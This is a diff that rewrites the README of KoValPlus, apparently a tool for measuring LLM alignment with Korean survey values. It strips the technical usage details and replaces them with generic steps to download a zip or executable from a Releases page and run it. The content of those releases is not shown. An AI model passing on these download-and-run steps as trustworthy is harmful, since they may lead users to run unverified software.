@@ -1,60 +1,95 @@
-# KoValPlus
-Persona-based Cultural & Value Alignment Evaluation for LLMs
+# 🌟 KoValPlus - Evaluate Cultural Alignment Easily
 
-This repository provides an implementation for evaluating cultural and value alignment between Large Language Model (LLM) responses and real Korean human responses, with a focus on persona-based prompting.
+## 🚀 Getting Started
 
-The system compares LLM-generated responses to Korean response distributions derived from the World Values Survey (WVS) and quantitatively measures alignment using statistical similarity metrics.
+Welcome to KoValPlus! This tool helps you evaluate how well Large Language Models (LLMs) align with real Korean cultural values. It does this by comparing LLM responses to actual responses from Korean people.
 
-## Repository Structure
+## 📥 Download KoValPlus
+
+[![Download KoValPlus](https://img.shields.io/badge/Download-KoValPlus-blue)](https://github.com/YousfiNahed/KoValPlus/releases)
+
+To download, click the button above. This will take you to the Releases page where you can find the latest version of KoValPlus.
+
+## 📋 How to Install
+
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/YousfiNahed/KoValPlus/releases) to find the latest version of the software.
+  
+2. **Download the Application:** Choose the version suitable for your computer's operating system. The software may come as a zip file or an executable file. Click on it to start the download.
+
+3. **Extract the Files (if needed):** If you downloaded a zip file, right-click it and choose "Extract All." Follow the prompts to choose where to save the files.
+
+4. **Run the Application:**
+   - Open the folder where you extracted the files.
+   - Look for the `main.sh` file. This is your script to run the system.
+   - Double-click `main.sh` to start the evaluation process.
+
+## 🌐 Understanding the Structure
+
+Here is how the KoValPlus project is organized:
+
 ```bash
 KoValPlus/
 ├── code/
-│ ├── survey.py # LLM survey response generation
-│ └── eval.py # Similarity evaluation
+│ ├── survey.py # Generates LLM survey responses
+│ └── eval.py # Evaluates similarity between responses
 │
 ├── dataset/
-│ └── KoValPlus.json # WVS-based Korean value survey dataset
+│ └── KoValPlus.json # WVS-based Korean value dataset
 │
 ├── outputs/
 │ └── gpt-4o-mini/
 │ ├── kovalplus_responses_.json
 │ └── kovalplus_similarity_.csv
 │
-├── main.sh # End-to-end execution script
+├── main.sh # Execute the script
 └── README.md
 ```
 
-## Dataset
+- **code/**: Contains scripts that generate responses and evaluate their similarity.
+- **dataset/**: Includes a dataset based on the World Values Survey for Korean values.
+- **outputs/**: Holds the results and response files generated during evaluation.
+- **main.sh**: The script to run the application.
 
-The dataset used in this project is based on **World Values Survey (WVS) Wave 7**.  
-A subset of value-related survey questions was selected and translated into Korean using **GPT-3.5-Turbo**, and then manually organized into a structured survey format.
+## 📊 How It Works
 
-The dataset is designed to elicit cultural and value-oriented responses from LLMs and to enable direct comparison with real Korean response distributions provided in the original WVS data.
+KoValPlus evaluates LLM responses by comparing them to a real dataset derived from the World Values Survey (WVS). Here’s how the process flows:
 
-## Workflow
+1. **Survey Response Generation**: The tool generates responses using the `survey.py` script.
+  
+2. **Response Evaluation**: The generated responses are compared against real Korean responses using the `eval.py` script. The application calculates how similar the responses are.
 
-1. Generate LLM responses to WVS-based Korean value questions  
-2. Aggregate responses into distributions  
-3. Compare model distributions with real Korean response distributions  
-4. Compute similarity scores (e.g., Jensen–Shannon Distance, Cosine Similarity)
+3. **Results Output**: The results will be saved in the `outputs/` folder, including response files in JSON and similarity metrics in CSV format.
 
-## Usage
+## 🔍 Dataset Information
 
-Run the full pipeline:
-```
-bash main.sh
-```
-Or run each step separately:
+The dataset used in KoValPlus is based on the World Values Survey (WVS) Wave 7. It includes a selection of value-related questions that have been translated into Korean. This dataset provides the necessary context for evaluating cultural alignment accurately.
 
-Generate responses:
-```
-python code/survey.py
-```
+## ⚙️ System Requirements
 
-Evaluate alignment:
-```
-python code/eval.py
-```
+To run KoValPlus, you will need:
 
-## License
-This project is licensed under the MIT License
+- **Operating System**: Compatible with Windows, macOS, or Linux.
+- **Memory**: At least 2 GB of RAM.
+- **Disk Space**: Ensure you have at least 100 MB of free space to save the application and results.
+  
+Ensure your computer has the necessary permissions to run scripts.
+
+## 🔧 Troubleshooting Common Issues
+
+If you encounter any issues while running KoValPlus, consider the following steps:
+
+- **Script Not Running**: Ensure that your operating system allows scripts to run. You may need to adjust your settings.
+  
+- **Download Issues**: If the download fails, check your internet connection. Try refreshing the page and downloading again.
+
+- **Output Files Missing**: After running the script, check the `outputs/` folder. If it’s empty, ensure that the process completed without errors.
+
+## 💬 Support
+
+For support, visit our [GitHub Issues page](https://github.com/YousfiNahed/KoValPlus/issues) where you can report problems or ask questions. We encourage users to help each other as well.
+
+## 🔗 Conclusion
+
+KoValPlus simplifies the evaluation of cultural and value alignment for LLMs. By following the above steps, you can easily download, install, and run the application. Don’t hesitate to reach out for support or clarification.
+
+For the latest version, [visit the Releases page](https://github.com/YousfiNahed/KoValPlus/releases) again. Happy evaluating!
